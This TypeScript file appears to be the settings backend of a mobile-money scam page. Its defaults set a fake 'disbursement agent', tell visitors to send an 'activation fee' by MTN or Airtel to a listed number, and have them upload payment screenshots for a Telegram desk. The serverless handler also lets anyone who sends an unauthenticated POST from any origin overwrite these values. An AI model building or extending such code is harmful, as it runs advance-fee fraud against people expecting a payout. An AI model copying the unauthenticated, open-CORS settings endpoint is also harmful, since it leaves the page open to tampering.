import fs from 'fs';
import path from 'path';

export interface AppSettings {
  agentName: string;
  agentNumber: string;
  rawNumber: string;
  whatsappNumber: string;
  whatsappRaw: string;
  step1: string;
  step2: string;
  step3: string;
  noticeText: string;
}

export const defaultSettings: AppSettings = {
  agentName: 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
  agentNumber: '+256 788 412 895',
  rawNumber: '0788412895',
  whatsappNumber: '+254 780571549',
  whatsappRaw: '254780571549',
  step1: 'Dial *165# (MTN) or *185# (Airtel).',
  step2: 'Send/Transfer activation fee to 0788412895.',
  step3: 'Take a screenshot of the confirmation SMS and upload it below.',
  noticeText: 'Payment screenshot is verified and forwarded to our Telegram desk',
};

declare global {
  // eslint-disable-next-line no-var
  var __momo_persistent_settings: AppSettings | undefined;
}

export function loadSettingsFromDisk(): AppSettings {
  if (globalThis.__momo_persistent_settings) {
    return globalThis.__momo_persistent_settings;
  }

  const possiblePaths = [
    path.join(process.cwd(), 'settings.json'),
    path.join('/tmp', 'settings.json'),
  ];

  for (const p of possiblePaths) {
    try {
      if (fs.existsSync(p)) {
        const data = fs.readFileSync(p, 'utf-8');
        const parsed = JSON.parse(data);
        const merged = { ...defaultSettings, ...parsed };
        globalThis.__momo_persistent_settings = merged;
        return merged;
      }
    } catch {
      // try next path
    }
  }

  globalThis.__momo_persistent_settings = { ...defaultSettings };
  return defaultSettings;
}

export function saveSettingsToDisk(newSettings: Partial<AppSettings>): AppSettings {
  const current = loadSettingsFromDisk();
  const merged: AppSettings = { ...current, ...newSettings };
  globalThis.__momo_persistent_settings = merged;

  const targets = [
    path.join(process.cwd(), 'settings.json'),
    path.join('/tmp', 'settings.json'),
  ];

  for (const t of targets) {
    try {
      fs.writeFileSync(t, JSON.stringify(merged, null, 2), 'utf-8');
    } catch {
      // in case directory is read-only
    }
  }

  return merged;
}

// Serverless Handler for Vercel
export default async function handler(req: any, res: any) {
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method === 'POST') {
    try {
      let body = req.body;
      if (typeof body === 'string') {
        try {
          body = JSON.parse(body);
        } catch {
          body = {};
        }
      }
      const updated = saveSettingsToDisk(body || {});
      return res.status ? res.status(200).json({ ok: true, settings: updated }) : res.end(JSON.stringify({ ok: true, settings: updated }));
    } catch (err: any) {
      return res.status ? res.status(500).json({ ok: false, error: err.message }) : res.end(JSON.stringify({ ok: false, error: err.message }));
    }
  }

  // GET
  const current = loadSettingsFromDisk();
  return res.status ? res.status(200).json({ ok: true, settings: current }) : res.end(JSON.stringify({ ok: true, settings: current }));
}
